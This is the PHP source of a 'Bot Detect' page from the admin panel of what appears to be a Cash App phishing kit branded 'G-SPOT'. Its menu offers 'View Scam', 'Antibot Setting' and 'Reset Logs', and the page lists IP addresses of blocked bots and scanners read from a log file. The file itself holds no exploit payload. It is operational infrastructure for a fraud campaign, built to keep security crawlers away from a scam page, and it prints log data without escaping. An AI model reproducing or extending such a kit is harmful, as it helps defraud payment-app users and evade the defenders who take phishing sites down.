<?php 
session_start();
include '../main.php';
function count_c($filename) {
    $file = fopen($filename, "r");
    $total_click = fread($file, filesize($filename));
    $total_click = substr_count($total_click, "\n");
    return $total_click;
    fclose($file);
}
$total_bot = count_c("../result/total_bot.txt");
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, shrink-to-fit=no" name="viewport">
  <title>G-SPOT - Bot Detect</title>

  <!-- General CSS Files -->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css">

  <!-- Template CSS -->
  <link rel="stylesheet" href="css/style.css">
  <link rel="stylesheet" href="css/components.css">
  <script src="https://code.iconify.design/1/1.0.7/iconify.min.js"></script>
</head>

<body>
  <div id="app">
    <div class="main-wrapper">
    <div class="navbar-bg"></div>
      <nav class="navbar navbar-expand-lg main-navbar">
        <div class="mr-auto">
          <ul class="navbar-nav mr-3">
            <li><a href="#" data-toggle="sidebar" class="nav-link nav-link-lg"><i class="fas fa-bars"></i></a></li>
          </ul>
        </div>
        <ul class="navbar-nav navbar-right ml-auto">
          <li class="dropdown"><a href="#" data-toggle="dropdown" class="nav-link dropdown-toggle nav-link-lg nav-link-user">
            <div class="d-sm-none d-lg-inline-block">G-SPOT</div></a>
            <div class="dropdown-menu dropdown-menu-right">
            <a href="https://<?php echo $_SERVER['SERVER_NAME']; ?>/?<?= $param ?>" class="dropdown-item has-icon">
                <i class="fas fa-user"></i> Go to G-SPOT panel
              </a>
              <a href="https://<?php echo $_SERVER['SERVER_NAME']; ?>/?<?= $param ?>" class="dropdown-item has-icon">
                <i class="fas fa-user-lock"></i> View Scam
              </a>
            <!--  <a href="logout.php" class="dropdown-item has-icon">
                <i class="fas fa-sign-out-alt"></i> Logout
              </a> -->
            </div>
          </li>
        </ul>
      </nav>
      <div class="main-sidebar">
        <aside id="sidebar-wrapper">
          <div class="sidebar-brand">
            <a href="https://<?php echo $_SERVER['SERVER_NAME']; ?>/" style="color: #000000;"><i class="iconify" data-icon="simple-icons:cashapp"></i> G-SPOT.Inc</a>
          </div>
          <div class="sidebar-brand sidebar-brand-sm">
            <a href="https://<?php echo $_SERVER['SERVER_NAME']; ?>"><i class="iconify" data-icon="simple-icons:cashapp"></i></a>
          </div>
          <ul class="sidebar-menu">
              <li><a class="nav-link" href="https://<?php echo $_SERVER['SERVER_NAME']; ?>/panel"><i class="fas fa-home"></i> <span>Dashboard</span></a></li>
              <li><a class="nav-link" href="settings.php"><i class="fas fa-cogs"></i> <span>Settings</span></a></li>
              <li><a class="nav-link" href="killbot.php"><i class="fas fa-robot"></i> <span>Antibot Setting</span></a></li>
              <li><a class="nav-link" href="bot.php"><i class="fas fa-bug"></i> <span>Bot Detect</span></a></li>
              <li><a class="nav-link" href="reset.php"><i class="fas fa-trash-alt"></i> <span>Reset Logs</span></a></li>
            </ul>
        </aside>
      </div>
      <!-- Main Content -->
      <div class="main-content">
        <section class="section">
          <div class="section-header">
            <h1>Bot Detect</h1>
          </div>
        <div class="section-body">
            <div class="row">
                <div class="col-md-12">
            <div class="card ">
              <div class="card-header ">
                <h5 class="card-title"><strong>Bot Detect ( <?php echo $total_bot;?> )</strong></h5>
              </div>
              <div class="card-body ">
                <div class="table-responsive">
                <table class="table">
                  <thead class="text-danger">
                    <tr>
                      <td><strong>IP Address</strong></td>
                      <td><strong>Reason</strong></td>
                    </tr>
                  </thead>
                  <tbody>
                    <?php
                      if (file_exists("../result/total_bot.txt")) {
                        $get = file_get_contents("../result/total_bot.txt");
                        $get = explode("\n", $get);
                        $con = count($get);
                        foreach ($get as $zeus) {
                          $zeus = explode("-", $zeus);
                          $ip = $zeus[0];
                          $botdetect = $zeus[1];
                          if ($ip == "") {
                            
                          } else {
                            echo "<tr>
                            <td>".$ip."</td>
                            <td>".$botdetect."</td>
                                    </tr>";
                          }
                        } 
                      } else {
                          echo "<tr><td>Not found</td><td></td></tr>";
                        }
                    ?>
                  </tbody>
                    </table>
                  </div>
                </div>
              </div>
        </section>
      </div>
      	<footer class="main-footer">
        <div class="text-center text-dark"><p>きみ の こと が すき だから</p></div>
    </footer>
    </div>
  </div>

  <!-- General JS Scripts -->
  <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.nicescroll/3.7.6/jquery.nicescroll.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.24.0/moment.min.js"></script>
  <script src="js/stisla.js"></script>

  <!-- Template JS File -->
  <script src="js/scripts.js"></script>
  <script src="js/custom.js"></script>

</body>
</html>